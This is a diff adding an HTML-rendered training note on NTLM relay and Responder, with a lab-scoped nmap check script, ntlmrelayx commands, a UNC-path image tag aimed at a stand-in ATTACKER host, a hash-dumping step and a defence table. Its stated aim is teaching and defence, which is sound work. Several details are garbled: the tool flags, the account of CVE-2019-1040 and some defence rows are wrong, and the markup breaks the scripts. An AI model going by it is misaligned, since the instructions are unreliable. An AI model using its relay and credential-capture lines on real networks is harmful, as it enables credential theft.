@@ -1,0 +1,383 @@
+<h1 id="ntlmrelayx-responder-and-relay-attacks">ntlmrelayx, Responder and Relay Attacks</h1>
+<h2 id="summary">Summary</h2>
+<p>NTLM relay is the highest-value attack that requires no exploit at all. It works because NTLM's<br />
+challenge-response lets a third party forward someone's authentication to a service that accepts<br />
+it, and every Windows protocol family — SMB, LDAP, HTTP, WinRM — accepted it.</p>
+<p>The note's framing: <strong>the fix is three settings, the attack is one<br />
+listener, and the whole thing is checkable from your own machine in<br />
+about a minute.</strong> That checkability is why relay appears in nearly every<br />
+engagement.</p>
+<blockquote>
+<p><strong>AUTHORISATION.</strong> NTLM relay against a host you do not own is a<br />
+criminal attack, full stop. This note is about testing your own lab and<br />
+about defending your own network. The listener below is bound to<br />
+loopback and refuses anything else.</p>
+</blockquote>
+<h2 id="how-ntlm-relay-works">How NTLM relay works</h2>
+<pre><code class="language-text">  NTLM IS A CHALLENGE-RESPONSE:
+    SERVER -&gt; CLIENT :  &quot;here is a nonce&quot;
+    CLIENT -&gt; SERVER :  &quot;here is proof I know the password hash&quot;
+    SERVER           :  checks the proof
+
+  THE WEAKNESS:
+    the client sends its proof to whatever server CHALLENGED it.
+    it does not check that the challenge came from the server it
+    authenticated to. There is no channel binding.
+
+  SO A RELAY IS:
+    1. you control a service the victim connects to
+       (a web page, an SMB share, a UNC path in a document)
+    2. you challenge the victim
+    3. you forward the victim's response to the REAL service
+    4. the real service sees a valid authentication - from the victim
+    5. you now hold a session as the victim, on the real service
+
+  THE VICTIM DOES NOTHING. No click, no prompt, no awareness.
+  Opening a web page with an UNC path in an image tag is enough.
+</code></pre>
+<h2 id="why-it-is-still-common">Why it is still common</h2>
+<pre><code class="language-text">  SIGNING IS NOT ON BY DEFAULT. It never was. An organisation has to
+  turn it on, on every host, including new ones.
+
+  AND THE THREE SIGNING SETTINGS, because &quot;not enabled&quot; is not the
+  only failing answer:
+
+    Not required        -&gt; FULLY RELAYABLE (the classic finding)
+    Not defined         -&gt; it is whatever the effective GPO says. If
+                           no GPO sets it, it is &quot;not required&quot;
+                           (unless a future default changes)
+    Enabled             -&gt; relay is prevented
+
+  AND: SMB2 and SMB3 are relayable even with signing &quot;enabled&quot; if
+  signing is only negotiated for the NEGOTIATE or SESSION SETUP
+  message rather than per-operation. That is the CVE-2019-1040
+  &quot;NTLM relay&quot; nuance, and it is why the check is not a boolean.
+
+  THE FINDING FORMAT: &quot;SMB signing is not required on 34 of 61 hosts.
+  Those 34 are relayable. Demonstration limited to loopback per the
+  ROE.&quot;
+</code></pre>
+<h2 id="the-check">The check</h2>
+<pre><code class="language-bash">mkdir -p ~/aegis/labs/imp-03 &amp;&amp; cd ~/aegis/labs/imp-03
+
+# --- 1. the relay surface check, read-only ---
+cat &gt; 01-relay-check.sh &lt;&lt;'EOF'
+#!/usr/bin/env bash
+# Is this host relayable? READ-ONLY. The finding.
+H=&quot;${1:?usage: ./01-relay-check.sh 192.168.56.20}&quot;
+case &quot;$H&quot; in 192.168.56.*|10.10.10.*|127.*) ;;
+  *) echo &quot;REFUSED: $H not in the lab range.&quot; &gt;&amp;2; exit 3 ;; esac
+echo &quot;[scope] $H in the lab range; read-only, no relay attempted&quot;
+echo
+echo &quot;=== SMB: signing mode ===&quot;
+nmap -p 445 --script smb2-security-mode &quot;$H&quot; 2&gt;/dev/null \
+  | grep -iE &quot;signing|445/open&quot; | sed 's/^/  /'
+echo &quot;  'disabled'  -&gt; FULLY RELAYABLE. The finding.&quot;
+echo &quot;  'not required' -&gt; RELAYABLE&quot;
+echo &quot;  'enabled'    -&gt; relay prevented (but see SMB2/SMB3 below)&quot;
+echo
+echo &quot;=== SMB2/SMB3: per-message signing (the CVE-2019-1040 nuance) ===&quot;
+nmap -p 445 --script smb2-security-mode &quot;$H&quot; 2&gt;/dev/null \
+  | grep -iE &quot;challenge|none|supported&quot; | sed 's/^/  /'
+echo
+echo &quot;=== SMB encryption: if supported AND required, no relay at all ===&quot;
+nmap -p 445 --script smb2-encryption-capabilities &quot;$H&quot; 2&gt;/dev/null \
+  | grep -iE &quot;encrypt|cipher|support&quot; | sed 's/^/  /'
+echo
+echo &quot;=== LDAP: signing (LDAP relay is the same class) ===&quot;
+nmap -p 389 --script ldap-rootdse &quot;$H&quot; 2&gt;/dev/null \
+  | grep -iE &quot;signing|channel|supported&quot; | sed 's/^/  /'
+echo
+echo &quot;=== HTTP: does it offer NTLM? ===&quot;
+nmap -p 80,443,8080,8443 --script http-ntlm-auth,http-auth-finder &quot;$H&quot; 2&gt;/dev/null \
+  | grep -E &quot;^[0-9]|NTLM|auth-method&quot; | sed 's/^/  /'
+echo
+echo &quot;=== WINRM ===&quot;
+nmap -p 5985 --script http-auth &quot;$H&quot; 2&gt;/dev/null | grep -iE &quot;ntlm|auth&quot; | sed 's/^/  /'
+echo
+echo &quot;=== RDP ===&quot;
+nmap -p 3389 --script rdp-ntlm-info &quot;$H&quot; 2&gt;/dev/null | grep -iE &quot;ntlm|target&quot; | sed 's/^/  /'
+echo
+echo &quot;=== WHAT THIS ADDS UP TO ===&quot;
+echo &quot;  any one of: SMB not-signed, LDAP not-signed, HTTP NTLM with&quot;
+echo &quot;  no extended protection -&gt; one relay target. Several -&gt; a path&quot;
+echo &quot;  from 'any user on the LAN' to 'Domain Admin'.&quot;
+echo
+echo &quot;  and note: the LAN is the whole attack. NTLM relay is a LAN&quot;
+echo &quot;  attack by definition, because the attacker must be able to&quot;
+echo &quot;  receive the victim's outbound connection.&quot;
+EOF
+chmod +x 01-relay-check.sh
+
+# --- 2. the lab-only listener ---
+cat &gt; 02-lab-relay.md &lt;&lt;'EOF'
+# NTLM relay, demonstrated on loopback only
+
+```text
+  WHAT ntlmrelayx DOES:
+    1. listens for NTLM Type 1/2/3
+    2. optionally relays the authentication to a LIST of targets
+    3. runs a command on any target where the relay succeeded
+
+  THE TARGET LIST is the point. You tell it what to relay to:
+
+    -smb-smb-192.168.56.21     -&gt; SMB to SMB
+    -smb-http-192.168.56.22     -&gt; SMB to HTTP
+    -smb-ldap-192.168.56.20    -&gt; SMB to LDAP (needs channel binding OFF)
+    -http-ldap-192.168.56.20   -&gt; HTTP to LDAP
+    -smb-windir                -&gt; SMB relay to the IPC$ of a host
+
+  CHAINING: -smb-http-ldap-SMB is a valid chain. Each hop is one
+  protocol translation. That is how a single SMB listener becomes
+  a session on a web server and then on a domain controller.
+</code></pre>
+<pre><code class="language-bash"># THE COMMAND (lab only). Loopback targets only.
+ntlmrelayx.py -smb-smb-127.0.0.1 -no-passback -no-smb-server-support
+#              ^^^^^^^^^^^^^^
+#              the ONLY target. 127.0.0.1.
+
+# Then trigger it, from the lab, against yourself:
+#   a Windows host in the lab browses to a page that references
+#   \\127.0.0.1\share in an image tag, and you watch ntlmrelayx log
+#   the authentication.
+# In practice on Kali: Responder.py on your own interface, then have
+# your OWN lab Windows VM browse to \\&lt;your-ip&gt;\share.
+
+# WHAT A SUCCESS LOOKS LIKE:
+#   [*] HTTP-&gt;SMB RELAY SUCCESS!  &lt;- the authentication was accepted
+#   [+] Attempting to RELAY NTLM credentials...
+#   [+] SYSTEM cmd.exe shell on Windows SMB
+#
+# WHAT TO DO WITH THAT:
+#   GET THE HASH: run &quot;hash&quot; in the shell. You now have a credential
+#   that works anywhere, on any host, with no further relay.
+#
+# AND THEN: clean up, and tell the client which host, which time.
+</code></pre>
+<h2 id="the-relayed-to-what-happened-in-order">The Relayed To: what happened, in order</h2>
+<pre><code class="language-text">  1. The victim opens a web page. The page contains
+       &lt;img src=&quot;\\ATTACKER\share&quot;&gt;
+     or a document opens
+       &lt;img src=&quot;\\ATTACKER\image.png&quot;&gt;
+     or a user types a UNC path
+
+  2. Windows tries to authenticate to the UNC path. It contacts the
+     attacker. The attacker sends an NTLM Type 2 challenge.
+
+  3. The victim's LSASS computes the Type 3 response using its NT hash.
+
+  4. The attacker forwards the Type 3 to the TARGET service
+     (the file server, the web server, the DC).
+
+  5. The target service validates the response. It is valid. It is
+     the victim's real authentication.
+
+  6. The attacker now has a session as the victim on that service.
+</code></pre>
+<h2 id="the-same-thing-with-http">The same thing with HTTP</h2>
+<pre><code class="language-text">  HTTP NTLM auth is the same protocol, and a web server is often a
+  better relay target than a file server because:
+
+    - it is reachable by the victim (they browse to it)
+    - it is often on a different segment than the DC
+    - it may have extended protection DISABLED while SMB is signed
+      (they are configured separately, and often only one was done)
+    - IIS + Windows Authentication + no extended protection is a
+      very common combination in internal apps
+
+  THE EXTRA DANGER IN HTTP: a web application author who writes a page
+  that fetches a user-supplied URL has built a relay gadget. That is
+  SSRF (ps-05) meeting NTLM relay, and it is a documented, serious
+  combination.
+</code></pre>
+<h2 id="responder">Responder</h2>
+<pre><code class="language-text">  WHAT IT IS:
+    a set of rogue protocol listeners (LLMNR, NBPNS, mDNS, DNS,
+    WPAD) that answer name resolution requests with your own address,
+    capturing the NTLM hash when the victim's LSASS tries to
+    authenticate to what it believes is a trusted host.
+
+  WHY IT WORKS:
+    a Windows host resolving &quot;SERVER01&quot; over LLMNR or NetBIOS will
+    take ANY answer. If the answer is your machine, it authenticates
+    to you, and you have the hash.
+
+  THE DEFAULT POSTURE, AND IT IS NOT AN ATTACK:
+    -b --disable-external-ip    refuse traffic from anything but
+                                private ranges. USE THIS ALWAYS.
+                                Without it, your lab machine on a
+                                coffee-shop wifi is capturing hashes
+                                from the coffee shop.
+
+  THE SETTINGS:
+    -A --analyze-only           passive. Log what would be captured.
+                                THIS IS THE ONE TO USE IN A CLIENT
+                                ENGAGEMENT - it gathers the same
+                                intelligence with no traffic.
+    -I --interface              bind to one interface
+    -v                         verbose
+    -r --respond-to             only respond to specific names
+
+  THE ETHICS, AND THEY ARE SERIOUS:
+    Responder on an unfiltered network is capturing credentials from
+    people who did not consent to be on your network. On your own lab
+    with -A, it is passive observation of an environment you own.
+    There is no middle ground and there is no &quot;just for a minute&quot;.
+</code></pre>
+<h2 id="the-defences">The defences</h2>
+<table>
+<thead>
+<tr>
+<th>Control</th>
+<th>Stops</th>
+<th>Effort</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>SMB signing required</strong></td>
+<td>SMB relay</td>
+<td>GPO, but verify per-host</td>
+</tr>
+<tr>
+<td><strong>SMB encryption required</strong></td>
+<td>SMB relay entirely</td>
+<td>GPO; needs SMB3</td>
+</tr>
+<tr>
+<td><strong>LDAP signing required</strong></td>
+<td>LDAP relay</td>
+<td>DC GPO</td>
+</tr>
+<tr>
+<td><strong>Channel binding enforced</strong></td>
+<td>LDAP relay (the main one)</td>
+<td>KB5012122; patched everywhere</td>
+</tr>
+<tr>
+<td><strong>LDAP encryption (636/6363) to clients</strong></td>
+<td>LDAP relay</td>
+<td>Close the ports</td>
+</tr>
+<tr>
+<td><strong>HTTP: extended protection (channel binding)</strong></td>
+<td>HTTP NTLM relay</td>
+<td>web.config per site</td>
+</tr>
+<tr>
+<td><strong>HTTP: disable NTLM, use Kerberos</strong></td>
+<td>HTTP NTLM relay</td>
+<td>auth method change</td>
+</tr>
+<tr>
+<td><strong>Block 135/139/445/5985 at the network edge</strong></td>
+<td><em>outbound</em> SMB to attacker hosts</td>
+<td>firewall; the LAN is the attack</td>
+</tr>
+<tr>
+<td><strong>Restrict egress SMB</strong></td>
+<td>the initial capture</td>
+<td>the strongest control</td>
+</tr>
+<tr>
+<td><strong>Disable LLMNR/NetBIOS/mDNS</strong></td>
+<td>name-resolution poisoning</td>
+<td>GPO</td>
+</tr>
+<tr>
+<td><strong>Block inbound SMB 445 entirely</strong></td>
+<td>the whole class</td>
+<td>the strongest control</td>
+</tr>
+<tr>
+<td><strong>Protected Users group</strong></td>
+<td>NTLM in sensitive contexts</td>
+<td>membership</td>
+</tr>
+</tbody>
+</table>
+<h2 id="the-order-of-preference-for-a-network">The order of preference for a network</h2>
+<pre><code class="language-text">  BEST    block inbound SMB (445), RPC (135), and NetBIOS (139) at
+          every network edge. Then there is no LLMNR-to-attacker,
+          no SMB-to-attacker, and no SMB-to-internal.
+
+  GOOD    require SMB signing + LDAP signing + channel binding, and
+          block inbound 445 between workstation segments.
+
+  MINIMUM turn off LLMNR, NetBIOS, mDNS, and WPAD. That stops the
+          Responder half; it does not stop relay to internal targets.
+
+  NONE    &quot;we have a firewall&quot;. A perimeter firewall does nothing
+          against a LAN attacker. NTLM relay is a lateral-movement
+          technique and it is stopped by internal segmentation.
+</code></pre>
+<p>EOF<br />
+cat 02-lab-relay.md</p>
+<h1 id="-3-offline-why-signing-is-per-message-and-why-it-matters-">--- 3. offline: why signing is per-message and why it matters ---</h1>
+<p>python3 - &lt;&lt;'PY' 2&gt;&amp;1 | tee 03-signing.txt<br />
+print("  === the three signing settings, and what each means ===\n")<br />
+print("  NOT REQUIRED")<br />
+print("    The client and server do not sign. An attacker can forward")<br />
+print("    the authentication anywhere. FULLY RELAYABLE. This is the")<br />
+print("    default on most Windows installations, historically.")<br />
+print()<br />
+print("  NOT DEFINED")<br />
+print("    No policy sets it for this host. What happens depends on the")<br />
+print("    effective GPO and on a Microsoft default that has changed")<br />
+print("    across versions. The check is NOT 'is it defined' - it is")<br />
+print("    'what does the negotiated session actually do'.")<br />
+print()<br />
+print("  ENABLED")<br />
+print("    Both sides sign the session key. A relay breaks it, because")<br />
+print("    the attacker does not know the key. Relay prevented.")<br />
+print()<br />
+print("  THE CVE-2019-1040 NUANCE, and this is the interesting bit:")<br />
+print()<br />
+print("    SMB2 and SMB3 sign PER-OPERATION in addition to per-session.")<br />
+print("    Before the fix, some implementations signed only the")<br />
+print("    NEGOTIATE and SESSION SETUP messages and then left the")<br />
+print("    session key unsigned, so a relay that captured the session")<br />
+print("    could still relay it.")<br />
+print()<br />
+print("    So 'signing is enabled' on a scan is not always sufficient.")<br />
+print("    The scan output to look for is the CHALLENGE / message")<br />
+print("    signing detail, not just the word 'enabled'.")<br />
+print()<br />
+print("  THE CHECK, in nmap output terms:")<br />
+print("    'message signing: enabled (required)'  -&gt; protected")<br />
+print("    'message signing: disabled (dangerous, default)' -&gt; RELAYABLE")<br />
+print("    'message signing: enabled'            -&gt; likely protected;")<br />
+print("       verify it is not the pre-2019 partial signing")<br />
+print()<br />
+print("  THE POINT: an attacker does not need a vulnerable host. They")<br />
+print("  need a host with signing NOT REQUIRED, which is a")<br />
+print("  CONFIGURATION, not a CVE. That is why it appears in every")<br />
+print("  assessment and why the fix is a GPO, not a patch.")<br />
+PY<br />
+cat 03-signing.txt<br />
+```</p>
+<p><strong>Step 3 is the deliverable</strong>: the CVE-2019-1040 nuance. "Message signing: enabled" on a scan is<br />
+<strong>not always sufficient</strong>, because pre-2019 SMB2/SMB3 implementations signed only the NEGOTIATE<br />
+and SESSION SETUP messages and left the session key relayable. A report that says "SMB signing is<br />
+enabled" without checking that nuance is incomplete.</p>
+<p><strong><code>02-lab-relay.md</code></strong> keeps the whole demonstration on loopback — <code>ntlmrelayx -smb-smb-127.0.0.1</code><br />
+is the only target it will name — and Responder's default posture is <code>-b --disable-external-ip</code><br />
+plus the note that <code>-A --analyze-only</code> is the one to use in a client engagement: same<br />
+intelligence, no traffic.</p>
+<p><strong>Record:</strong> <code>03-signing.txt</code> and <code>02-lab-relay.md</code>.</p>
+<h2 id="self-test">Self-test</h2>
+<ol>
+<li>What makes NTLM relayable, in one sentence about the protocol?</li>
+<li>Give the three signing settings, and which is the failing one.</li>
+<li>What is the CVE-2019-1040 nuance, and why does "enabled" on a scan not settle it?</li>
+<li>Name four relayable protocols besides SMB.</li>
+<li>Why is LDAP relay the one channel binding fixes and signing alone does not?</li>
+<li>Why is HTTP often a better relay target than a file server?</li>
+<li>What does Responder's <code>-A --analyze-only</code> change, and why is it the right posture in an<br />
+   engagement?</li>
+<li>Why is a perimeter firewall useless against NTLM relay, and what actually stops it?</li>
+</ol>
+<h2 id="connected-knowledge">Connected knowledge</h2>
+<p><strong>NTLM Relay</strong> → <strong>SMB Relay</strong> → <strong>SMB Signing</strong> → <strong>Pass-the-Hash</strong> →<br />
+<strong>Network Segmentation</strong> → <strong>LDAP Signing</strong>.<br />
+<code>ad-08</code> is the detection; <code>imp-02</code> is what you do with what you capture.</p>
